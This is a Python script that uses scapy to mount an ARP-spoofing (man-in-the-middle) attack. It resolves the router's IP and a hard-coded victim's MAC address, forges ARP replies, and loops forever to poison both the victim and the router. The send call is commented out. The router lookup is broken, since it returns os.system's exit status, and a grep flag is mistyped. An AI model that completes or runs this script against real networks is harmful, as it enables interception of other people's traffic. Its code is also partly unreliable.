#!/usr/local/bin/python3

import os
import sys
import time
import scapy.all as scapy

def get_router_ip(opsys):
    if opsys == "Linux":
        ip = os.system('ip route show | grep - i \'default via\' | awk \'{print $3 }\'')
        return ip
    else:
        ip = os.system('netstat -nr | grep default | grep -o \'[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\'')
        # ip = re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip)
        return ip


def get_mac(ip):

    # combine two packets
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # send the packet
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)  # packet, timeout

    # return target's MAC address
    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):

    # this is the packet that is set to the victim device
    target_mac  = get_mac(target_ip)
    packet      = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)

    # we set "op" to 2 because it's a response packet, not a request
    # we set "pdst" to the IP of the target machine (use networkscanner.py)
    # we set "hwdst" to the MAC address of the target machine (use networkscanner.py)
    # we set "psrc" to the IP of the router (use networkscanner.py)

    print(packet.summary())
    print(packet.show())

    # scapy.send(packet)


def check_os():
    # Check the Operating System
    from sys import platform
    if platform == "linux" or platform == "linux2":
        print("[+] You are running: Linux")
        return "Linux"
    elif platform == "darwin":
        print("[+] You are running: OSX")
        return "OSX"
    elif platform == "win32":
        print("[+] You are running: Windows")
        return "Windows"
    else:
        print("[+] You are running: Other Operating System")
        return "Other"


os.system('clear')
opsys       = check_os()

print("[+] This is your router's IP:")
router_ip   = get_router_ip(opsys)

while True:
    # send spoof packets continuously to router and victim
    spoof("192.168.1.5",router_ip)
    spoof(router_ip,"192.168.1.5")
    time.sleep(2)